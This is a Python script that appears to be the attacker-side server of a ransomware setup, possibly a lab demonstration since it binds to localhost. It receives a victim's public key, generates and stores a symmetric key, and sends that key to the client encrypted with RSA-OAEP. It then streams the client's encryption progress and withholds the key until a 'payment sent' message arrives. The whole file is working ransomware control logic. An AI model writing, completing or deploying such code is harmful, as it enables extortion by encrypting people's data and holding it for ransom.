import socket
import os
import time
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding


PORT = 1234


def main():
    server = socket.socket()
    server.bind(("127.0.0.1", PORT))
    server.listen(1)
    print(f"[+] Server listening on: {PORT}")
    conn, addr = server.accept()
    print(f"[+] Received connection from {addr}")
    time.sleep(0.2)
    pub_key_bytes = conn.recv(4096)
    pub_key = serialization.load_pem_public_key(pub_key_bytes)
    print("[+] Public Key Received")
    time.sleep(0.2)
    secret_key = os.urandom(32)
    print(f"[i] Generated Secret Key: {secret_key.hex()}")
    time.sleep(0.2)
    with open("secret.bin", "wb") as file:
        file.write(secret_key)
    print("[i] Copy of secret saved on ./secret.bin")
    time.sleep(0.2)

    # Encrypt secret with victim's public Key
    print("[i] Encrypting secret key with victims public key")
    encrypted_secret_key = pub_key.encrypt(secret_key, padding.OAEP(padding.MGF1(algorithm=hashes.SHA256()), hashes.SHA256(), None))
    time.sleep(0.2)
    print("[+] Done\n[i] sending encrypted key")
    conn.sendall(encrypted_secret_key)
    print("[+] Done")
    print("[i] Starting Encryption on client...\n")
    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(data.decode(), end="")

    print("\n[+] Done Encryption, waiting to receive payment to send secret key...")
    conn.close()
    conn, addr = server.accept()
    data = conn.recv(1024).decode()

    while not "payment sent" in str(data):
        data = conn.recv(1024)
    time.sleep(0.2)
    print("[+] Payment receive from victim, sending key")
    conn.sendall("confirm decryption".encode())
    with open("secret.bin", "rb") as file:
        secret_key = file.read()

    conn.sendall(secret_key)
    print("[+] Done")
    conn.close()
    server.close()


if __name__ == "__main__":
    main()

